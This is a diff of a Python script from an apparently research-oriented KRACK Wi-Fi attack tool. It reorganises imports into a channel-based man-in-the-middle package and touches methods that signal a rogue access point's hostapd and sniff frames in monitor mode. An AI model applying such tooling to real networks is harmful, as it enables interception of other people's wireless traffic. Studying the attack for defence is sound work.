@@ -6,14 +6,18 @@
 # This code may be distributed under the terms of the BSD license.
 # See README for more details.
 
+import sys, os
+username = os.path.expanduser(os.environ["SUDO_USER"])
+sys.path.append('/home/' + username + '/.local/lib/python2.7/site-packages')
+
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 import time, argparse, heapq, subprocess, atexit, select, textwrap
 from datetime import datetime
-from packet_processing import *
-from log_messages import *
-from mitm_code import *
+
+from mitm_channel_based.all import *
+
 
 
 class ClientState():
@@ -240,7 +244,7 @@ class KRAckAttack():
 		Description: send FINISH_4WAY signal to hostapd (Rogue AP)
 		'''
 		log(DEBUG, "Sent frame to hostapd: finishing 4-way handshake of %s" % stamac)
-		self.hostapd_ctrl.request("FINISH_4WAY %s" % stamac)
+		self.mitmconfig.hostapd_ctrl.request("FINISH_4WAY %s" % stamac)
 
 	def send_disas(self, macaddr):
 		'''
@@ -377,7 +381,7 @@ class KRAckAttack():
 
 	def handle_rx_realchan(self):
 		'''
-		Description: handle with the packets sniffed by the `nic_real` on the Real Channel. `nic_real` is in the monitor mode.
+		Description: handle with the packets sniffed by the `nic_real` (monitor mode) on the Real Channel.
 
 		Rules to display frames sent TO the real AP:
 
